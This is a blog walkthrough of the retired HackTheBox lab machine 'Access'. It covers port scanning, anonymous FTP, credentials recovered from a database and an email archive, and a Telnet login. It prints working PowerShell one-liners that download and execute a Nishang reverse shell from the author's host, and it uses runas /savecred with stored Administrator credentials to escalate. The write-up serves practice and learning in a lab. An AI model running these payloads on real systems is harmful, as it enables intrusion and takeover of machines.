title:  "HackTheBox - Access"
---
HackTheBox is a great platform for hackers/penetration testers to practice and learn with. Their network consists of 2 machine pools - Active and Retired. Active machines have no writeups and grant points to your profile and allow you to rank up and climb the leaderboard. Retired machines have many writeups and are great for learning and completing for fun, but don’t give points towards a higher rank. “Access” was recently retired on 02/03/19.

It's been a long time! As usual life has been a little crazy lately to the point where I felt I needed to withdraw for a bit and reflect after personal events. All is well now and I hope to be back to hacking and penetration testing for fun. OSCP plans are still in place, just delayed to the end of summer so I can spend more time reflecting on life and spend plenty of time with my family.

I rooted Access 7 months ago, it was my 4th machine owned on HackTheBox. Personally I think the score of 20 is too low, but then again it was a fairly easy box if your enumeration is on point. Most of my pain came from lack of knowledge on Windows command line and not getting the quotes right when trying to execute my reverse shell. Regardless, Access was a really fun machine and I definitely learned a lot.

First, I start by enumerating the open ports on Access.htb. I've learned from my mistakes on recent adventures to always run a full scan at first, then enumerate open ports after if at all possible
```
root@collector:~/htb/boxes/access# nmap -sS -sV -T4 -oA initial -p- -Pn 10.10.10.98
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-29 23:29 CDT
Nmap scan report for 10.10.10.98
Host is up (0.064s latency).
Not shown: 65532 filtered ports
PORT STATE SERVICE VERSION
21/tcp open ftp Microsoft ftpd
23/tcp open telnet?
80/tcp open http Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The full port scan shows me that port 21 (FTP), 23 (Telnet), and 80 (HTTP) are open. I can view the website, but nothing really helps here and it ends up being somewhat of a rabbit hole when trying to get a shell. Lets enumerate the ports we found
```
root@collector:~/htb/boxes/access# nmap -sV -sC -oA portenum 10.10.10.98 -p 21,23,80
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-29 23:37 CDT

```

Here I can see that anonymous FTP is allowed, which is always a great method to gather information on my target. Telnet needs credentials, so lets connect and look around on the FTP server with anonymous:anonymous
```
root@collector:~/htb/boxes/access# ftp 10.10.10.98

ftp> 
```

I notice there are 2 directories, and in those directories are some interesting files I want to analyze. I turn on binary file transfer for FTP to avoid corruption and offline the files to my attacking machine
```

200 PORT command successful.

```

Looking further into the files, it seems we have a Microsoft Access Database and a .zip holding an Outlook .pst file (attempting to unzip will show the contents)
```
root@collector:~/htb/boxes/access# unzip Access\ Control.zip
Archive:  Access Control.zip
   skipping: Access Control.pst      unsupported compression method 99
```

I now know of much easier ways to view the database, but at the time of rooting this machine 7 months ago I couldn't get mdb-tools to work correctly on my Kali machine, so I transferred the file to my Windows machine and used an open source database viewer. After analysis of the database I was able to locate the "auth_user" table that displayed plain text credentials, among those were engineer:access4u@security. access4u@security was the password needed to unzip the .pst file!

I imported the .pst file to Evolution (preferred email client) and discovered more intel in an email. The email exposed security:4Cc3ssC0ntr0ller which are the credentials needed to telnet to Access.htb

Lets connect to Access.htb via Telnet
```
root@collector:~/htb/boxes/access# telnet 10.10.10.98
Trying 10.10.10.98...
Connected to 10.10.10.98.

My favorite Powershell reverse shell is Nishang, here is the GitHub link you can clone if you want to give it a try. I'll also add the example code you need to add at the end of the script for it to connect back to you (use your IP and whatever port you want it to connect to)
```
https://github.com/samratashok/nishang

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 4444
```

Here comes the shell, lets start the HTTP server to host our .ps1 file
```
root@collector:~/htb/boxes/curling# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

Now we need to listen on our attacking machine. Remember the port you told your reverse shell to connect back to
```
root@collector:~/htb# nc -vlnp 4444
listening on [any] 4444 ...
```

Now on the victim machine, I run a Powershell one liner to run and execute my reverse shell
```
C:\Users\security>powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8000/shell.ps1')"
```

And now we have a user reverse shell
```
root@collector:~/htb# nc -vlnp 4444
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.98] 49159

Here is a picture showing all of my terminals, having a terminal manager helps out a lot with this

![AccessReverse](/assets/AccessReverse.png)

Because of the nature of the unstable shell, I couldn't get Sherlock to work properly because I couldn't see any kind of errors. Skipping vulnerabilities, I work on using the same Powershell one liner to upload and run JAWS (Just Another Windows (Enum) Script) to view my privilege escalation options. Immediately when the script finishes, I notice the administrator credentials are currently stored on the machine...
```
-----------------------------------------------------------
 Stored Credentials
-----------------------------------------------------------

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```

I look through the rest of the JAWS output, I don't really find much but I know these credentials are what I need. You can use runas with the /savecred option to run commands as the ACCESS\Administrator account. The only problem with this is you have to get the quotes down for the Windows command line syntax. Again I struggled with this a bit especially with my unstable shell, but I got it down.

From here I'm thinking of getting a reverse shell as the local administrator. Even though I'm in a Powershell, I still need to execute it when I'm using the stored admin credentials, here is the syntax I ended up using
```
runas /user:ACCESS\Administrator /savecred "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8000/shell.ps1')"
```

And I now own the box. 

Access was a lot of fun and felt pretty real, I could definitely see a scenario like this happening in a real world penetration test. I haven't dealt much with databases either, so this was a nice refresher. I hope you enjoyed the walkthrough and learned something, I should have another up soon for another box that was retired while I was away. Good luck and happy hacking.
